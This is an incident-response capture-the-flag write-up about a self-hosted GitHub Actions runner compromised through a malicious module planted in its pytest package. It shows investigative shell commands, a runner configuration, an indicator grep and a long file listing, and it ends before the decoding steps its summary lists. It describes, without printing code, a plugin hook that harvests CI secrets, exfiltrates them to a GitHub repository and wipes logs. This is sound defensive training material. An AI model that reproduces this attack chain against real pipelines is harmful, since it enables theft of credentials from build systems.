# Trust Issues

```
Difficulty: Medium
Category: Supply Chain / IR
Author: Eden Abergil
```

## Summary

| Step | User / Access                  | Technique Used                        | Result                                                                                                       |
| :--: | :----------------------------- | :------------------------------------ | :----------------------------------------------------------------------------------------------------------- |
|   1  | Incident Responder             | **GitHub Repository Analysis**        | Identified a public repository being used as an attacker-controlled dead-drop location for exfiltrated data. |
|   2  | Root Access (Compromised Host) | **Host Enumeration**                  | Determined the compromised system was operating as a self-hosted GitHub Actions runner.                      |
|   3  | GitHub Actions Runner          | **Workflow Log Analysis**             | Correlated recurring `inventory-test` workflow executions with observed exfiltration activity.               |
|   4  | Local Investigation            | **Supply Chain Compromise Discovery** | Identified a malicious Python module embedded within the `pytest` package.                                   |
|   5  | Malicious Package              | **Pytest Plugin Abuse**               | Malicious code executed automatically through the `pytest_sessionfinish` plugin hook.                        |
|   6  | Malicious Plugin               | **Environment Variable Harvesting**   | Collected CI/CD secrets, credentials, tokens, and workflow environment variables.                            |
|   7  | Malicious Plugin               | **Fernet Encryption**                 | Encrypted harvested data using a hardcoded Fernet key prior to exfiltration.                                 |
|   8  | Malicious Plugin               | **GitHub Contents API Abuse**         | Uploaded encrypted payloads to a public repository using a hardcoded Personal Access Token (PAT).            |
|   9  | Malicious Plugin               | **Anti-Forensics**                    | Deleted workspace artifacts and GitHub Actions runner logs to hinder investigation.                          |
|  10  | Incident Responder             | **XOR String Decoding**               | Recovered the embedded Fernet key, GitHub PAT, repository information, and exfiltration parameters.          |
|  11  | Incident Responder             | **Fernet Decryption**                 | Decrypted the stolen `.secret` file recovered from the attacker-controlled repository.                       |
|  12  | Incident Responder             | **Secret Recovery**                   | Extracted sensitive environment variables and recovered the challenge flag.                                  |



![Wiz](wiz_trust_issues_mindmap.png)


# Initial Reconnaissance

## Attacker Repository

The investigation began with analysis of the public GitHub repository:

[stolen-sparkles](https://github.com/m4gicst34l3r/stolen-sparkles)

![Wiz](wiz_github_.png)
![Wiz](wiz_github_com.png)

### Findings

- Approximately 240 files stored under a `data/` directory.
- Files used the `.secret` extension.
- Hundreds of automated commits with the message:

```text
update runtime data
```

- File contents began with:

```text
gAAAAAB
```

This prefix is characteristic of Python Fernet-encrypted tokens.



# Identifying the Host Purpose

## System Enumeration

```bash
root@magic-runner-acme:/# hostname && whoami && uname -a
magic-runner-acme
root
Linux magic-runner-acme 6.1.128 #1 SMP PREEMPT_DYNAMIC Tue Dec  2 17:27:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

![Wiz](wiz_github_machine.png)

The hostname strongly suggested a CI/CD runner.



## GitHub Actions Runner Discovery

```bash
ls -la /home/ubuntu/
```

A GitHub Actions runner installation was found:

```text
/home/ubuntu/actions-runner/
```

![Wiz](wiz_github_action.png)

Runner configuration:

```bash
cat /home/ubuntu/actions-runner/.runner
```
![Wiz](wiz_github_action_dir.png)


```json
{
  "agentId": 23,
  "agentName": "magic-runner-acme",
  "poolId": 1,
  "poolName": "Default",
  "serverUrl": "https://pipelinesghubeus6.actions.githubusercontent.com/Y5FpppI1CJ8lsMb5fuVVwrlp47N930Kg5i1ythDA2nYH9mPfPR/",
  "gitHubUrl": "https://github.com/acme-codebase-prod/k8s-magic-tool",
  "workFolder": "_work",
  "useV2Flow": true,
  "serverUrlV2": "https://broker.actions.githubusercontent.com/"
```

![Wiz](wiz_github_action_runner.png)


### Conclusion

The compromised machine was a self-hosted GitHub Actions runner servicing:

```text
acme-codebase-prod/k8s-magic-tool
```



# Workflow Investigation

## Runner Log Analysis

```bash
grep -i "inventory-test" \
/home/ubuntu/actions-runner/_diag/Runner_*.log
```

![Wiz](wiz_github_action_logs.png)


### Result

```text
Running job: inventory-test
Job inventory-test completed with result: Succeeded
```

The workflow executed hourly.

This timing matched the commit frequency observed in the attacker's repository.



## Anti-Forensics Indicators

Workspace inspection:

```bash
ls /home/ubuntu/actions-runner/_work/k8s-magic-tool/k8s-magic-tool/
```

Result:

```text
(empty)
```

Worker logs:

```bash
find /home/ubuntu/actions-runner/_diag/ -name "Worker*"
```

Result:

```text
(no files found)
```

Evidence indicated deliberate cleanup activity.

```bash
ls /home/ubuntu/.local/lib/python3.10/site-packages/ | grep -v -E "^google|^pip|^pkg_|^__" | sort
```


![Wiz](wiz_github_action_cleint.png)

# Supply Chain Compromise

## Python Package Investigation

User-installed Python packages were inspected:

```bash
ls /home/ubuntu/.local/lib/python3.10/site-packages/
```

Searching for suspicious strings:

```bash
root@magic-runner-acme:/home/ubuntu/actions-runner# grep -rl "stolen-sparkles\|m4gicst34l3r\|github\.com\|git push" \
  /home/ubuntu/.local/lib/python3.10/site-packages/ 2>/dev/null \len-sparkles\|m4
  | grep -v __pycache__ib/python3.10/site-packages/ 2>/dev/null \
/home/ubuntu/.local/lib/python3.10/site-packages/packaging-26.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/rsa-4.9.1.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/requests_oauthlib-2.0.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/exceptiongroup/_formatting.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/config/__init__.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/cacheprovider.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/junitxml.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/nodes.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/reports.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/main.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/python_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/_io/pprint.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/assertion/util.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/recwarn.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/logging.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/monkeypatch.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/python.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/pathlib.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/fixtures.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/raises.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/doctest.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/_py/path.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/capture.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/_code/source.py
/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/_code/code.py
/home/ubuntu/.local/lib/python3.10/site-packages/tomli-2.4.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/websocket/tests/echo-server.py
/home/ubuntu/.local/lib/python3.10/site-packages/websocket/_http.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/whiley.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/dax.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/urbi.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/c_like.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/dotnet.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/codeql.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/elpi.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/csound.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/julia.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/_mysql_builtins.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/pawn.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/scripting.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/floscript.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/perl.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/mips.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/lisp.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/business.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/slash.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/carbon.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/esoteric.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/stata.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/javascript.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/arturo.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/kusto.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/jslt.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/_postgres_builtins.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/promql.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/kuin.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/_julia_builtins.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/prql.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/webassembly.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/ruby.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/verification.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/dsls.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/savi.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/meson.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/rita.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/minecraft.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/lean.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/markup.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/teal.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/modeling.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/tnt.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/templates.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/lexers/archetype.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/dracula.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/paraiso_dark.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/material.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/gh_dark.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/onedark.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/gruvbox.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/lovelace.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/solarized.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/paraiso_light.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/styles/zenburn.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/__init__.py
/home/ubuntu/.local/lib/python3.10/site-packages/pygments/cmdline.py
/home/ubuntu/.local/lib/python3.10/site-packages/pluggy-1.6.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/google_auth-2.47.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/python_dateutil-2.9.0.post0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/iniconfig-2.3.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/dateutil/tz/_common.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/config/exec_provider.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/utils/quantity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/watch/watch_test.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/coordination_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/internal_apiserver_v1alpha1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/networking_v1beta1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/autoscaling_v2_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/admissionregistration_v1alpha1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apiextensions_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/resource_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/admissionregistration_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apis_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/certificates_v1beta1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/autoscaling_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/authentication_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/custom_objects_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/openid_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/core_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/admissionregistration_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/policy_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/resource_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/node_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/flowcontrol_apiserver_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/certificates_v1alpha1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/coordination_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/networking_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apiregistration_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/storage_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/rbac_authorization_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/admissionregistration_v1beta1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/batch_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/version_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apiextensions_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/storagemigration_v1alpha1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/authorization_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/storage_v1alpha1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/discovery_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/scheduling_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/flowcontrol_apiserver_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/networking_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/certificates_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/batch_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/coordination_v1alpha2_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/certificates_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/core_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/node_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/scheduling_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apiregistration_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/storage_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/storage_v1beta1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/rbac_authorization_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/discovery_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apps_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/policy_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/authorization_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/logs_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/resource_v1beta2_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/internal_apiserver_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/events_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/authentication_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/storagemigration_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/resource_v1alpha3_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/resource_v1beta1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/events_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/well_known_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/coordination_v1beta1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/autoscaling_v1_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api/apps_api.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/api_client.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/rest.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/__init__.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_sub_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_secret_env_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_webhook_conversion.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_template_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_rolling_update_deployment.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_certificate_signing_request_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_network_policy_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_host_alias.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_basic_device.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_mutating_admission_policy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha3_cel_device_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_namespace_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_persistent_volume_claim_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_config_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_http_header.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_user_subject.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_network_policy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_claim_consumer_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_restart_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_pods_metric_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_custom_resource_conversion.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_cidr_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_network_device_data.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_claim_template_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_storage_capacity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_cidr_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/admissionregistration_v1_service_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_stateful_set_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_endpoint_hints.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_os.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_mutating_webhook_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_daemon_set.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_state_waiting.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_replica_set_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_disruption_budget.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_subject_access_review_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_failure_policy_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_affinity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_config_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_affinity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_env_from_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_claim_template_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_limit_range_item.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cluster_role_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_slice.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_lease.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_policy_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_job_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_load_balancer_ingress.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cluster_trust_bundle_projection.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_storage_version_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_token_request_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_metric_target.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_file_key_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_job_template_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_webhook.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_priority_level_configuration_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_external_metric_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_replica_set_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/discovery_v1_endpoint_port.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_non_resource_policy_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_named_rule_with_operations.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_user_info.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_horizontal_pod_autoscaler_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/core_v1_event_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_slice_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_config_map_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_iscsi_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_secret_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_persistent_volume_claim_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_role_binding.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_storage_version.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_audit_annotation.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_horizontal_pod_autoscaler_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_persistent_volume_claim_template.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_endpoints_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_scale.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress_load_balancer_ingress.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_projection.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_scheduling_gate.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_admission_policy_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_swap_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha2_lease_candidate_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_horizontal_pod_autoscaler_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validation_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_config_map_projection.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_node_affinity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_variable.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_glusterfs_persistent_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_stateful_set_update_strategy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_priority_level_configuration_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_capacity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_match_resources.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_node_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_mutating_admission_policy_binding_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_resize_policy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_fc_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_typed_object_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_metric_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_group.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_param_kind.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_nfs_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_class_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_priority_level_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_taint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cron_job_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_object_metric_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_system_info.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_service_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_rolling_update_stateful_set_strategy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_config_map_env_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_pool.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_admission_policy_binding_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_custom_resource_definition_status.py
